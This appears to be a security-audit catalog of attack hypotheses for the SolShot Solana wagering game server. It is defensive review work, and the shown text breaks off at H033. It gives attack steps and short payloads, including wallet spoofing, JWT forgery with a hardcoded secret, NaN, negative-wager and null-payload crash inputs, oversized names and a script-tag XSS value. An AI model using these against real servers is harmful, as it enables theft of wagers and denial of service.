# Attack Strategy Catalog

**Project:** SolShot
**Generated:** 2026-02-14
**Total Strategies:** 75

---

## Strategy Generation Sources

This catalog was generated from:
- 10 focus area context analyses (Phase 1)
- Unified architectural understanding (Phase 2)
- Historical exploit patterns adapted for Node.js/Socket.IO/Solana web games
- Novel attack surfaces specific to SolShot's architecture

---

## Strategy Index by Category

### Access Control (8 strategies)
- H001: Unauthenticated wager room creation
- H002: Wallet address spoofing in joinRoom
- H003: deleteRoom host-only bypass
- H004: Unauthenticated fire event exploitation
- H005: Cross-room socket event injection
- H006: Auth bypass via skipping authenticate event
- H007: JWT secret hardcoded fallback forgery
- H008: CORS wildcard cross-origin session hijacking

### Arithmetic & Input Validation (10 strategies)
- H009: NaN injection via fire handler crashing settlement
- H010: Infinity power causing DoS via trajectory calculation
- H011: Negative wager bypassing tier validation
- H012: Arbitrary startX/startY position spoofing
- H013: Client-supplied count/max DoS in createWeaponArray
- H014: Type confusion on weaponId string vs number
- H015: Null payload destructuring crash (server kill)
- H016: Float-point settlement arithmetic rounding theft
- H017: Megabyte player name memory exhaustion
- H018: Color field XSS/injection via non-integer values

### State Machine (8 strategies)
- H019: Ready event during BATTLE resets Gold
- H020: Double settlement via disconnect + fire race
- H021: playAgainRequest wipes wager mid-settlement
- H022: BATTLE→SETTLING missing transition (state stuck in BATTLE)
- H023: turnCount never resets — instant round completion
- H024: Shoot (legacy) relay bypasses server validation
- H025: Multiple ready events create duplicate match state
- H026: shopDone without shopPhase state transition

### CPI & External (6 strategies)
- H027: Fail-open balance check — zero-SOL wager join
- H028: Settlement stub masquerading as real transfer
- H029: Devnet RPC fallback in production
- H030: Express/Socket.IO CVE exploitation
- H031: 30MB body parser memory exhaustion
- H032: npm dependency chain vulnerability exploitation

### Token & Economic (10 strategies)
- H033: SHOT token unlimited farming via colluding players
- H034: SHOT reward pool supply cap bypass
- H035: Prestige burn reversal via server restart
- H036: Gold farming via arbitrary fire position
- H037: Play-again wager deletion — free rematch exploit
- H038: Unfunded wager room creation (no creator balance check)
- H039: Weapon firing without purchase (inventory bypass)
- H040: Host tiebreak advantage exploitation in wagers
- H041: Prestige weapon purchase broken — getWeapon scope
- H042: Time-waste griefing — no turn timer stalling

### Account Validation (7 strategies)
- H043: Player name stored XSS via unsanitized broadcast
- H044: roomId format bypass and Socket.IO room injection
- H045: isHost flag staleness after leave/rejoin
- H046: MongoDB injection via unsanitized player name
- H047: Prototype pollution via terrainPath spread
- H048: Wallet format bypass — non-Base58 strings in wager
- H049: Object payload in color field

### Oracle & External Data (6 strategies)
- H050: Math.random() PRNG state recovery for terrain prediction
- H051: Weapon array PRNG leakage (100 samples at once)
- H052: Room ID enumeration and uninvited joining
- H053: Auth timestamp manipulation (+60s future window)
- H054: Auth replay attack within 5-minute window
- H055: RPC response staleness — double-entry wager attack

### Admin & Config (5 strategies)
- H056: /stats endpoint reconnaissance for attack timing
- H057: Error message information leakage to clients
- H058: MongoDB connection string exposure via error logging
- H059: No admin controls — inability to mitigate active exploit
- H060: nodemon in production dependencies

### Error Handling (7 strategies)
- H061: No uncaughtException handler — single error server crash
- H062: Fire handler unhandled rejection cascade
- H063: trackError() never called — silent failure accumulation
- H064: Settlement error still transitions to COMPLETE
- H065: MongoDB disconnect causes silent state divergence
- H066: Balance check error masking (returns 0 vs null)
- H067: Auth error detail leakage for format probing

### Timing & Ordering (8 strategies)
- H068: Concurrent fire events during settlement window
- H069: Disconnect during SETTLING destroys in-flight settlement
- H070: Room deletion during active settlement
- H071: Fire before terrain generated — null currentTurn bypass
- H072: Duplicate disconnect + leaveRoom settlement logic
- H073: Async settlement allows playAgainRequest to clear wagers
- H074: Event flooding DoS — no rate limiting on socket events
- H075: Socket.IO reconnection without re-authentication

---

## Strategy Definitions

---

## H001: Unauthenticated Wager Room Creation

**Category:** Access Control
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Common in web3 games — missing auth on financial operations

### Hypothesis
An attacker can create a wagered room without authenticating a wallet, set any wallet address as their identity, and exploit the settlement system.

### Attack Vector
1. Attacker connects a raw Socket.IO client — no `authenticate` event
2. Emits `createRoom` with `{ player: { name: "x", color: 0, walletAddress: "<victim_wallet>", wager: 0.5 } }`
3. Server stores attacker's socket with victim's wallet address in `wagerStates`
4. Match plays out — settlement attributes outcome to victim's wallet

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `createRoom` | 354-410 | No auth check before wager setup |
| `main.js` | `authenticate` | 170-177 | Optional, never enforced |
| `auth.js` | `handleAuthenticate` | 108-133 | Generates JWT never validated |

### Prerequisites
- Network access to server
- Knowledge of a valid Solana wallet address (public)

### Potential Impact
**Severity if confirmed:** CRITICAL
- Financial: With real settlement, winner payout goes to wrong wallet
- Users affected: Any player matching with the attacker
- Protocol state: wagerStates contains spoofed wallet addresses

### Investigation Approach
1. **Check:** Is `client.isAuthenticated` or equivalent checked before `createRoom`?
   - Look for: any guard referencing authentication state
   - In: `main.js:354-370`
2. **Check:** Does `walletAddress` get validated against `authenticatedWallets[client.id]`?
   - Look for: comparison with `authenticatedWallets`
   - In: `main.js:370-377`
3. **Determine:** Can a completely unauthenticated socket create a wager room?
   - Vulnerable if: No auth guard at handler entry
   - Safe if: Handler rejects when `authenticatedWallets[client.id]` is undefined AND wager > 0

---

## H002: Wallet Address Spoofing in joinRoom

**Category:** Access Control
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Sybil attacks in web3 protocols

### Hypothesis
A player can join a wager room with a spoofed wallet address (e.g., a rich wallet they don't own), pass the balance check, and have settlement directed to an address they control.

### Attack Vector
1. Attacker authenticates with wallet A (0 SOL)
2. Emits `joinRoom` with `walletAddress: "<rich_wallet_B>"` — a whale's address
3. `joinerWallet = walletAddress || authenticatedWallets[client.id]` → picks wallet B (truthy)
4. Balance check passes (wallet B has funds)
5. Settlement directs payout to... wallet A or B? Depends on which is stored

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `joinRoom` | 288-344 | walletAddress from payload takes priority |
| `main.js` | line 296 | 296 | `walletAddress \|\| authenticatedWallets[client.id]` |

### Potential Impact
**Severity if confirmed:** CRITICAL
- With real settlement: attacker receives payout from a wallet they proved (someone else proved) has balance

### Investigation Approach
1. **Check:** Is `walletAddress` from payload rejected when `authenticatedWallets[client.id]` exists?
   - Vulnerable if: payload wallet overrides authenticated wallet
   - Safe if: authenticated wallet is always used for wager operations

---

## H003: deleteRoom Host-Only Bypass

**Category:** Access Control
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Missing authorization checks (CWE-862)

### Hypothesis
A non-host player can delete a wagered room mid-match, wiping the wager state without settlement, effectively causing the host to lose their wager.

### Attack Vector
1. Host creates 0.5 SOL wager room
2. Attacker joins room
3. Match begins — attacker is losing
4. Attacker emits `deleteRoom`
5. `removeRoom()` deletes `wagerStates[roomId]` — no settlement or refund

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `deleteRoom` | 274-284 | No `client.isHost` check |

### Potential Impact
**Severity if confirmed:** CRITICAL
- Financial: Losing player avoids wager loss; winning player's payout destroyed
- Protocol state: wager state deleted without settlement

### Investigation Approach
1. **Check:** Is there any check that `client.isHost === true` or `room.host.socketId === client.id`?
   - Vulnerable if: only check is `client.roomId !== null`
   - Safe if: host identity verified before deletion

---

## H004: Unauthenticated Fire Event Exploitation

**Category:** Access Control
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Novel — game-specific

### Hypothesis
An unauthenticated socket in a room can emit fire events, influencing match outcome and settlement.

### Attack Vector
1. Attacker connects, skips authenticate, joins room via `joinRoom` (no auth required)
2. Attacker emits `fire` events to deal damage and influence match outcome
3. No check that the firing socket is authenticated

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `fire` | 671-872 | No auth check at handler entry |

### Potential Impact
**Severity if confirmed:** HIGH — match outcomes manipulated without identity verification

### Investigation Approach
1. **Check:** Does `fire` handler check `client.isAuthenticated`?
2. **Check:** Does `fire` handler verify the socket ID matches a room participant?

---

## H005: Cross-Room Socket Event Injection

**Category:** Access Control
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Novel — Socket.IO room isolation

### Hypothesis
A player in room A can emit events that affect room B by manipulating stored `client.roomId` or joining multiple Socket.IO rooms.

### Attack Vector
1. Player creates room A (gets `client.roomId = "A"`)
2. Player emits `joinRoom` for room B — `client.roomId` is updated to B
3. Player now receives events from room B but may still have subscriptions in room A
4. Or: player emits events after `client.roomId` has been manipulated

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `joinRoom` | 288-344 | client.roomId reassignment |

### Potential Impact
**Severity if confirmed:** HIGH — disrupting other players' matches

### Investigation Approach
1. **Check:** Does `joinRoom` properly leave the previous room before joining?
2. **Check:** Can a player be in multiple Socket.IO rooms simultaneously?

---

## H006: Auth Bypass via Skipping Authenticate

**Category:** Access Control
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Missing auth middleware pattern (CWE-306)

### Hypothesis
All game functionality works without ever calling `authenticate`, making the entire auth system decorative.

### Attack Vector
1. Connect Socket.IO client
2. Skip `authenticate` entirely
3. Emit `createRoom`, `joinRoom`, `fire`, etc. directly
4. All handlers execute without checking auth state

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | All handlers | * | No auth guard at any handler entry |

### Potential Impact
**Severity if confirmed:** CRITICAL — auth provides zero security value

### Investigation Approach
1. **Check:** Grep for `isAuthenticated` checks in any handler other than `getShotInfo` and `prestigeBurn`
2. **Determine:** Which handlers, if any, require authentication?

---

## H007: JWT Secret Hardcoded Fallback Forgery

**Category:** Access Control
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** CWE-798 — hardcoded credentials

### Hypothesis
If `JWT_SECRET` env var is unset, the server uses `'solshot-dev-secret-change-me'` — any attacker reading the source can forge valid JWTs.

### Attack Vector
1. Read source code — find `JWT_SECRET || 'solshot-dev-secret-change-me'`
2. Generate JWT: `jwt.sign({ wallet: 'attacker' }, 'solshot-dev-secret-change-me')`
3. If JWT validation is ever added, forged tokens pass

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `auth.js` | line 17 | 17 | Hardcoded fallback |

### Potential Impact
**Severity if confirmed:** HIGH — JWT forgery enables auth bypass if JWTs are ever enforced

### Investigation Approach
1. **Check:** Is `JWT_SECRET` set in production `.env`?
2. **Check:** Is `verifyToken()` called anywhere?

---

## H008: CORS Wildcard Cross-Origin Session Hijacking

**Category:** Access Control
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** CORS misconfiguration attacks

### Hypothesis
Any malicious website can connect to the SolShot server via Socket.IO (due to `origin: "*"`) and perform actions on behalf of visitors.

### Attack Vector
1. Attacker hosts malicious website
2. Website includes Socket.IO client connecting to SolShot server
3. Visitor's browser connects — attacker's JS intercepts auth data
4. Attacker replays captured auth signature on separate connection

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `index.js` | Socket.IO config | 15-20 | `origin: "*"` |
| `index.js` | Express CORS | 22 | `cors()` with no config |

### Potential Impact
**Severity if confirmed:** HIGH — session hijacking, auth credential theft

---

## H009: NaN Injection via Fire Handler Crashing Settlement

**Category:** Arithmetic
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Novel — NaN propagation in real-money systems

### Hypothesis
Sending `angle: NaN` or `power: "string"` produces NaN damage values that contaminate Gold, scores, and settlement calculations, potentially causing the match to never end or to settle incorrectly.

### Attack Vector
1. Emit `fire` with `{ angle: "abc", power: NaN, weaponId: 0, startX: 0, startY: 0 }`
2. Physics: `velocity = NaN * 8 = NaN`, `vx = NaN`, `vy = NaN`
3. All trajectory points are NaN — no collisions detected
4. `result.damage = {}` (empty) — no Gold awarded
5. Turn consumed without any damage — opponent wastes their real turn while attacker deals 0
6. Scores may accumulate NaN if any NaN value enters `addScore()`

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `fire` | 671 | No type/bounds validation |
| `physics.js` | `processShot` | 59-84 | Uses `angle`/`power` directly in Math functions |

### Potential Impact
**Severity if confirmed:** CRITICAL — corrupted match state, potential infinite game

---

## H010: Infinity Power DoS via Trajectory Calculation

**Category:** Arithmetic
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Algorithmic complexity DoS

### Hypothesis
Sending `power: 1e308` causes the trajectory loop to generate 3000 points with astronomical coordinates, producing a massive array that consumes memory when broadcast.

### Attack Vector
1. Emit `fire` with `{ power: 1e308, angle: 0.5, weaponId: 0, startX: 0, startY: 0 }`
2. `velocity = 1e308 * 8` — still finite but enormous
3. 3000 trajectory steps, each point at coordinates like `1e305+`
4. Trajectory array broadcast to both clients via Socket.IO
5. Repeat to exhaust server memory

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `physics.js` | `processShot` | 59-84 | MAX_TRAJECTORY_STEPS = 3000 bounds the loop |

### Potential Impact
**Severity if confirmed:** HIGH — server memory exhaustion, potential crash

---

## H011: Negative Wager Bypassing Tier Validation

**Category:** Arithmetic
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Input validation bypass via negative values

### Hypothesis
Sending `wager: -0.1` bypasses the `wagerAmount > 0` guard (evaluates to false), skipping `isValidWager()` entirely. A negative wager is stored, which would reverse payment direction in settlement.

### Attack Vector
1. Emit `createRoom` with `{ player: { wager: -0.1, ... } }`
2. `wagerAmount = -0.1`; check `if (wagerAmount > 0)` → false, validation skipped
3. `wagerStates[roomId] = { amount: -0.1, ... }` — stored
4. Settlement: `totalPot = -0.1 * 2 = -0.2`; `winner = -0.2 * 0.9 = -0.18`
5. With real transfers: winner OWES 0.18 SOL instead of receiving it

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `createRoom` | 369-374 | `wagerAmount > 0` guard |
| `solana.js` | `calculateSettlement` | 113-135 | Multiplies totalPot by shares |

### Potential Impact
**Severity if confirmed:** CRITICAL — reversed payment direction with real transfers

---

## H012: Arbitrary startX/startY Position Spoofing

**Category:** Arithmetic / Economic
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Novel — game physics trust boundary

### Hypothesis
The fire handler uses client-supplied `startX/startY` instead of server-stored tank position, allowing a player to fire from any position (e.g., directly above the opponent) for guaranteed maximum damage and Gold.

### Attack Vector
1. Emit `fire` with `startX: <opponent_x>, startY: <opponent_y - 50>, power: 1, angle: PI/2`
2. Projectile spawns directly above opponent, drops straight down
3. Max damage dealt every turn — Gold = `floor(60 * 15) = 900` per turn
4. In 10 turns: 9,000 Gold (enough for any weapon)

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `fire` | 671 | startX/startY from client payload |
| `physics.js` | `processShot` | 59-64 | Uses startX/startY as projectile origin |

### Potential Impact
**Severity if confirmed:** CRITICAL — complete Gold economy bypass, guaranteed wins in wager matches

---

## H013: createWeaponArray Unbounded Loop DoS

**Category:** Arithmetic / DoS
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Algorithmic complexity DoS (CWE-400)

### Hypothesis
Sending `count: 100000000` to `createWeaponArray` blocks the event loop for seconds generating a 100M-element array, causing DoS for all connected players.

### Attack Vector
1. Emit `createWeaponArray` with `{ count: 100000000, max: 10 }`
2. Server enters synchronous loop creating 100M array elements
3. Node.js event loop blocked — all other socket events queued
4. Server appears frozen to all players for ~5-10 seconds

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `createWeaponArray` | 645-658 | Client controls loop bound |

### Potential Impact
**Severity if confirmed:** HIGH — DoS for entire server

---

## H014: Type Confusion weaponId String vs Number

**Category:** Account Validation
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** JavaScript type coercion bugs

### Hypothesis
Sending `weaponId: "0"` (string) passes WEAPON_CATALOG lookup (property access coerces) but fails `Array.includes()` strict equality check, allowing duplicate weapon purchases.

### Attack Vector
1. Buy weapon 0 normally (stored as number 0 in inventory)
2. Emit `buyWeapon` with `{ weaponId: "0" }` (string)
3. `WEAPON_CATALOG["0"]` resolves correctly (JS property coercion)
4. `inventory.includes("0")` returns false (strict equality: "0" !== 0)
5. Weapon "purchased" again — Gold deducted but string ID pushed into inventory

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `buyWeapon` | 515-571 | No type check on weaponId |

### Potential Impact
**Severity if confirmed:** MEDIUM — Gold wastage, inventory pollution

---

## H015: Null Payload Destructuring Server Crash

**Category:** Error Handling
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Node.js unhandled rejection crash (CWE-755)

### Hypothesis
Sending `null` or `undefined` as the payload to any destructuring handler (fire, joinRoom, createRoom) causes a TypeError that crashes the Node.js process (Node 15+).

### Attack Vector
1. Emit `socket.emit('fire', null)`
2. Handler: `({angle, power, ...}) => { ... }` — cannot destructure null
3. TypeError thrown — no try/catch in handler
4. Unhandled rejection — no `process.on('unhandledRejection')` handler
5. Node.js 15+ default: process exits

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `fire` | 671 | Destructures payload without null guard |
| `main.js` | `joinRoom` | 288 | Same pattern |
| `main.js` | `createRoom` | 354 | Same pattern |

### Potential Impact
**Severity if confirmed:** CRITICAL — single packet server kill, all in-memory state lost

---

## H016: Float-Point Settlement Arithmetic Rounding Theft

**Category:** Arithmetic
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Rounding errors in DeFi (Solend, Mango)

### Hypothesis
The 90/7/3 split computed via individual multiplication could produce sums exceeding total pot due to float-point imprecision on certain wager amounts.

### Attack Vector
1. Create room with wager value that produces float error (e.g., exotic amount)
2. `winner = pot * 0.9` + `treasury = pot * 0.07` + `ops = pot * 0.03` > pot
3. With real transfers: protocol pays out more than it received

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `solana.js` | `calculateSettlement` | 113-135 | Float multiplication |

### Potential Impact
**Severity if confirmed:** MEDIUM — small rounding discrepancies per settlement

---

## H017: Megabyte Player Name Memory Exhaustion

**Category:** Input Validation / DoS
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Payload size attacks (CWE-400)

### Hypothesis
A player name of several megabytes is stored in-memory, persisted to MongoDB, and broadcast to ALL connected clients via `setRooms`, causing memory exhaustion and bandwidth DoS.

### Attack Vector
1. Emit `createRoom` with `name: "A".repeat(10_000_000)` (10MB name)
2. Name stored on socket object, room object, wagerStates, MongoDB
3. `io.emit('setRooms', ...)` broadcasts room list with 10MB name to every client
4. 100 connected clients × 10MB = 1GB outbound bandwidth per broadcast
5. Repeat with 10 rooms = 10GB total

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `createRoom` | 364 | No length check on name |
| `main.js` | `setRooms` | 342, 409 | Broadcasts to all clients |

### Potential Impact
**Severity if confirmed:** HIGH — server memory exhaustion, bandwidth DoS

---

## H018: Color Field XSS/Injection

**Category:** Account Validation
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Stored XSS via unvalidated fields

### Hypothesis
The `color` field accepts any type (string, object) without validation and is broadcast to clients. If rendered as innerHTML somewhere, XSS is possible.

### Attack Vector
1. Emit `createRoom` with `color: "<script>alert(1)</script>"`
2. Color stored and broadcast — if client renders as string in DOM, XSS executes

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `createRoom/joinRoom` | 329, 364 | No type validation on color |

### Potential Impact
**Severity if confirmed:** MEDIUM — XSS in other players' browsers

---

## H019: Ready Event During BATTLE Resets Gold

**Category:** State Machine
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Novel — game state machine bypass

### Hypothesis
The `ready` handler has no state check — emitting `ready` during BATTLE phase could trigger `initGold()` which resets Gold to 1000, wiping the opponent's earned Gold advantage.

### Attack Vector
1. Opponent earns 5000 Gold in battle through damage
2. Attacker emits `ready` during BATTLE phase
3. If handler executes without state guard: `initGold()` called, both players reset to 1000
4. Attacker neutralizes opponent's economy advantage

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `ready` | 417-507 | No matchState phase check |
| `gold.js` | `initGold` | * | Resets Gold to starting values |

### Potential Impact
**Severity if confirmed:** CRITICAL — economic manipulation mid-match

---

## H020: Double Settlement via Disconnect + Fire Race

**Category:** Timing / State Machine
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** TOCTOU race conditions in DeFi settlements

### Hypothesis
If a winning shot's async settlement is processing when the losing player disconnects, both the fire handler and disconnect handler execute settlement concurrently, resulting in double payout.

### Attack Vector
1. Player A fires winning shot — fire handler begins async `settleMatch()`
2. Before settlement completes, Player B's connection drops
3. Disconnect handler sees match not yet COMPLETE — initiates forfeit settlement for Player B
4. Two `settleMatch()` calls execute for the same match
5. With real transfers: total payout = 2 × pot

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `fire` | 807-830 | Async settlement |
| `main.js` | `disconnect` | 180-224 | Concurrent forfeit settlement |

### Potential Impact
**Severity if confirmed:** CRITICAL — double fund disbursement

---

## H021: playAgainRequest Wipes Wager Mid-Settlement

**Category:** State Machine
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Novel — state reset during async operation

### Hypothesis
Emitting `playAgainRequest` during the async settlement window deletes `wagerStates[roomId]`, causing the in-flight settlement to fail or reference deleted data.

### Attack Vector
1. Match ends — settlement begins (async)
2. Before settlement completes, losing player emits `playAgainRequest`
3. `delete wagerStates[client.roomId]` executes immediately
4. In-flight `settleMatch()` reads `wagerStates[roomId]` — undefined
5. Settlement fails silently or crashes

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `playAgainRequest` | 998-1044 | Deletes wagerStates |
| `main.js` | `fire` settlement | 807-830 | Reads wagerStates async |

### Potential Impact
**Severity if confirmed:** CRITICAL — settlement failure, wager loss

---

## H022: BATTLE→SETTLING Missing Transition

**Category:** State Machine
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Novel — incomplete state machine

### Hypothesis
The transition from BATTLE to SETTLING is not defined in the state machine transition table. `transitionState('SETTLING')` returns false, but the return value is never checked, causing the match to remain in BATTLE state during settlement.

### Attack Vector
1. Match is in BATTLE state
2. Winning shot triggers settlement — code calls `transitionState(ms, 'SETTLING')`
3. `VALID_TRANSITIONS` table has no BATTLE→SETTLING entry
4. `transitionState` returns false — state remains BATTLE
5. Attacker can still emit `fire` events during "settlement" because state is BATTLE

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `match.js` | `transitionState` | 42-54 | Transition table |
| `main.js` | match end logic | 807-830 | Never checks return value |

### Potential Impact
**Severity if confirmed:** HIGH — state machine bypass during settlement

---

## H023: turnCount Never Resets Between Rounds

**Category:** State Machine / Economic
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Novel — game logic bug

### Hypothesis
After round 1 ends, `turnCount` stays >= `turnsPerRound`. Every subsequent fire immediately triggers `isRoundOver()` again, making rounds 2+ last 0 turns.

### Attack Vector
1. Play round 1 normally (20 turns)
2. Round ends, `currentRound` incremented but `turnCount` NOT reset
3. Round 2 starts — first fire triggers `isRoundOver()` (turnCount still >= 20)
4. Round 2 ends immediately — player who dominated round 1 carries advantage

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `match.js` | `isRoundOver` | 105-110 | Checks turnCount >= turnsPerRound |
| `main.js` | round end logic | 786-870 | Never resets turnCount |

### Potential Impact
**Severity if confirmed:** HIGH — unfair multi-round matches

---

## H024: Legacy Shoot Relay Bypasses Server Validation

**Category:** State Machine
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Legacy code bypass

### Hypothesis
The `shoot` event relays client-supplied weapon data and trajectory to the opponent without any server validation, bypassing the server-authoritative fire handler.

### Attack Vector
1. Emit `shoot` with fabricated damage values, trajectory, and weapon data
2. Server relays directly to opponent via `opponentFire`
3. Client-side processes the fake shot data
4. Opponent sees impossible shots — no server check

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `shoot` | * | Legacy relay event |

### Potential Impact
**Severity if confirmed:** HIGH — client-side game state corruption

---

## H025: Multiple Ready Events Creating Duplicate State

**Category:** State Machine
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Novel

### Hypothesis
Rapidly emitting `ready` multiple times could create duplicate match states or trigger multiple `initGold()`/`createMatchState()` calls.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `ready` | 417-507 | No dedup guard on ready state |

### Potential Impact
**Severity if confirmed:** MEDIUM — corrupted match/Gold state

---

## H026: shopDone Without shopPhase Transition

**Category:** State Machine
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Novel

### Hypothesis
Emitting `shopDone` without being in WEAPON_SHOP state could trigger a premature state transition to BATTLE.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `shopDone` | 571-625 | State check exists via shopReady |

### Potential Impact
**Severity if confirmed:** MEDIUM — state machine bypass

---

## H027: Fail-Open Balance Check — Zero-SOL Wager Join

**Category:** CPI / External
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Fail-open anti-pattern (CWE-636)

### Hypothesis
A wallet with exactly 0 SOL passes the balance check because the guard `if (balanceCheck.balance > 0 && !balanceCheck.sufficient)` evaluates to false when balance is 0.

### Attack Vector
1. Create new Solana wallet (0 SOL)
2. Emit `joinRoom` for a 0.5 SOL wager room with new wallet
3. `verifyBalance` returns `{ sufficient: false, balance: 0 }`
4. Guard: `0 > 0 && !false` → `false && true` → `false` — NOT rejected
5. Player enters wager room with 0 SOL

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `main.js` | `joinRoom` | 306-317 | Balance check guard |
| `solana.js` | `verifyBalance` | 80-102 | Returns balance: 0 on error |

### Potential Impact
**Severity if confirmed:** CRITICAL — unfunded wager entry

---

## H028: Settlement Stub Masquerading as Real Transfer

**Category:** CPI / External
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Phantom transaction reporting

### Hypothesis
`settleMatch()` returns `success: true` and `txSignature: null` without executing any on-chain transfer. Clients receive `matchSettled` events suggesting SOL moved when it didn't.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `solana.js` | `settleMatch` | 139-163 | Returns success without transfer |

### Potential Impact
**Severity if confirmed:** HIGH — deceptive UX, potential fraud vector

---

## H029: Devnet RPC Fallback in Production

**Category:** CPI / External
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Environment misconfiguration

### Hypothesis
If `SOLANA_RPC` env var is unset, the server falls back to `api.devnet.solana.com`. Devnet SOL is free — any balance check passes.

### Attack Vector
1. Server deployed without `SOLANA_RPC` set
2. Balance checks query devnet
3. Attacker airdrops free devnet SOL
4. Passes all balance checks

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `solana.js` | line 22 | 22 | `process.env.SOLANA_RPC \|\| 'https://api.devnet.solana.com'` |

### Potential Impact
**Severity if confirmed:** HIGH — balance checks meaningless on wrong network

---

## H030: Express/Socket.IO CVE Exploitation

**Category:** CPI / External
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Known CVEs in Express 4.18.1, Socket.IO 4.5.1

### Hypothesis
The outdated Express and Socket.IO versions have known CVEs that could be exploited for DoS or code execution.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `package.json` | dependencies | * | Express 4.18.1, Socket.IO 4.5.1 |

### Potential Impact
**Severity if confirmed:** HIGH — 28 npm audit vulnerabilities (17 high)

---

## H031: 30MB Body Parser Memory Exhaustion

**Category:** CPI / External / DoS
**Estimated Priority:** Tier 2 (HIGH potential)
**Historical Precedent:** Body parser DoS

### Hypothesis
The 30MB body parser limit allows sending huge POST requests to exhaust server memory.

### Attack Vector
1. Send 30MB POST request to any Express endpoint
2. Express parses and holds entire body in memory
3. 100 concurrent requests = 3GB memory consumption
4. Server OOM crash

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `index.js` | Express config | 23-24 | `limit: "30mb"` |

### Potential Impact
**Severity if confirmed:** HIGH — trivial DoS via memory exhaustion

---

## H032: npm Dependency Chain Vulnerability

**Category:** CPI / External
**Estimated Priority:** Tier 3 (MEDIUM-LOW potential)
**Historical Precedent:** Supply chain attacks

### Hypothesis
The 28 npm vulnerabilities (including 17 high) in transitive dependencies could be exploited.

### Target Code
| File | Function | Lines | Relevance |
|------|----------|-------|-----------|
| `package.json` | all deps | * | npm audit shows 28 vulns |

### Potential Impact
**Severity if confirmed:** MEDIUM — depends on specific CVEs

---

## H033: SHOT Token Unlimited Farming via Collusion

**Category:** Token / Economic
**Estimated Priority:** Tier 1 (CRITICAL potential)
**Historical Precedent:** Reward farming in GameFi (Axie Infinity scholars)

### Hypothesis
Two colluding players can rapid-fire trivial matches (intentional misses, 20 turns each) to grind unlimited SHOT tokens through milestone rewards, including the recurring 500 SHOT every 50 matches after 100.

### Attack Vector
1. Open two browser tabs, each authenticated with different wallets
2. Tab 1 creates 0-wager room, Tab 2 joins
3. Both fire 20 turns of intentional misses (angle: 0, power: 100 — off screen)
